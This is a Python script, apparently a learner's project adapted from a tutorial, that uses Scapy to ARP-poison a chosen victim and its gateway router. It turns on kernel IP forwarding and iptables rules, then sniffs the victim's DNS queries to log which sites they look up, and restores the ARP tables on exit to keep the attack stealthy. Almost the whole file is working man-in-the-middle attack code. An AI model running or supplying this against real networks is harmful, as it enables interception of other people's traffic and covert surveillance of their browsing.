#!/usr/bin/python


# arp spoofing using scapy to send arp spoof packets, and to sniff dns from victim
# referenced from https://null-byte.wonderhowto.com/how-to/build-man-middle-tool-with-scapy-and-python-0163525/
# 	     and ebin.com/1cMu4kzZ


# remember that enabling ip_forard for kernel, it will automactically forward packets with dest ip address different from
# the interface attacker pc is using, and will forward according to routing table, which is to the default gateway
# then the default gateway will forward along the packets, and same goes for packets going to victim coming from router

#importing modules

import os
import sys
import time
from scapy.all import *

# getting inputs from the user to start off arp spoofing tool
	# once interuptted with the SIGINT, we are calling shutting down the program

print "[!] MAKE SURE YOU ARE RUNNING AS ROOT"

# for dev and testing purposes
#interface = "wlp0s20u9u2"
#victimIP = "192.168.1.114"
#gatewayIP = "192.168.1.1"

try:
	interface = raw_input("[*] Enter the Arping and Sniffing Interface: ")
	victimIP = raw_input("[*] Enter the Victim's IP Address: ")
	gatewayIP = raw_input("[*] Enter the Gateway Router's IP Address: ")
#    pass
except KeyboardInterrupt: # in case of ctrl C: SIGINT
	print "\n[!] User Requested Shutdown"
	print "[!] Exiting....." 
	sys.exit(1)	# exits the program with bash exit code of 1 for failure

# enabling kernel port forwarding, and allowing forward traffic from and to the victim's PC
	# using os.system, takes one arg of string type
print "\n[*] Enabling IP Forwarding...\n"
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
	# -s for source, -d for destination
print "\n[*] Allowing fowarding traffic from and to the Victim's IP\n"
os.system("iptables -A FORWARD -s " + victimIP + " -j ACCEPT" )
os.system("iptables -A FORWARD -d "+ victimIP + " -j ACCEPT")


# defining get MAC address function
def getMac(IP):
	# in order to get the mac address, we will send out an arp broadcast request 
	# to ask for the hardware address for the specified input IP
	# also we should turn off verbose from scapy
	conf.verb = 0
		# using the send and receive layer 2 function,has a timeout of 10 seconds which should be plenty for a LAN
			# interval of request is every 0.1 seconds
        request_packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP)
        reply = srp1(request_packet, timeout=10, iface=interface, inter=0.1)
        # reply will be the only answered packet, and it only has the response data

        if reply.haslayer(ARP): # this is to confirm that the response packet has a ARP layer, which it should
            return reply.getlayer(Ether).src # if it does, we will grab its hardware source for MAC requested

# defining the re arp function, for victim and gateway to reunite again
def reArp():
	print "\n[!] Restoring Targets........"
	# first we need to grab each of the MAC addresses then using the layer 3 send function to send a arp with correct values
	VictimMAC = getMac(victimIP)
	GatewayMAC = getMac(gatewayIP)
	send(ARP(op=2, pdst=victimIP, psrc=gatewayIP, hwdst=VictimMAC, hwsrc=GatewayMAC), count=7) # sending this 7 times
	send(ARP(op=2, pdst=gatewayIP, psrc=victimIP, hwdst=GatewayMAC, hwsrc=VictimMAC), count=7)
        print "[!] Disabling IP Forward..."
	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
	print "[!] Shutting Down"
	sys.exit(1)


# defining the arp spoof function, the function that will be responsible of arp spoofing
def arpSpoof(victimMac, gatewayMac):
        # arp spoofing gateway, using level 3 send from scapy, op=2 for reponse, and 1 for query
        send(ARP(op=2, pdst=victimIP, psrc=gatewayIP, hwdst=victimMac)) # hardware source will be from attacher pc, by scapy default
	# arp spoofing victim
	send(ARP(op=2, pdst=gatewayIP, psrc=victimIP, hwdst=gatewayMac))

# defining the dns sniffer handler
def dnsSniffHandler(pkt): 
	# filter if the packet is indeed a dns packet
	# also getting packet DNS layer query resource info, 0 means request packet
	if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
		# returning a string for sniff function to print out
		# need to get the DNS layer's query data information, of query name -> website name that victim has searched for
		return "Victim: " + victimIP + " has a DNS query for: " + pkt.getlayer(DNS).qd.qname


# defining the main mitm function
	# if unable to grab MAC, system will shutdown
def mainMITM():
	try:
		victimMAC = getMac(victimIP)
	except Exception: # anything goes wrong in the above block, will cause the termination of the program	
								    # we wont be flushing the user's iptables setting, 
								    # since it will restore to original after reboot unless saved
								    # optional, turning off port forwarding for the user
		print "[!] Couldn't Find the Victim's MAC"
		print "[!] Disabling IP Forward"
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
		print "[!] Exiting......."
		sys.exit(1)
	try: 
		gatewayMAC = getMac(gatewayIP)
	except Exception: # same goes for the router 
		print "[!] Couldn't Find the Gateway Router's MAC"
		print "[!] Disabling IP Forward"
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
		print "[!] Exiting.........."
		sys.exit(1)
	while True: 	# setting up an infinite loop to keep arp spoofing the victim and gateway, 1 second interval
		try: 
			arpSpoof(victimMAC, gatewayMAC)
			# also lets do a dns sniff on the victim IP, to be outputted using the prn callback, 
                        # we should only need about 3 packets, should be enough for per search, then restarting the arp and sniff in 1 sec
			sniff(iface=interface, filter="src " + victimIP+ " and udp and port 53", count=5, prn=dnsSniffHandler)
			time.sleep(1)
		except KeyboardInterrupt: 	# Ctrl C Signal
	# in case of interrupt signal while running the arp spoof, we need to reArp the devices to keep stealth
			reArp()
			break	# breaking out of the loop


# calling the main function, running the script
mainMITM()

























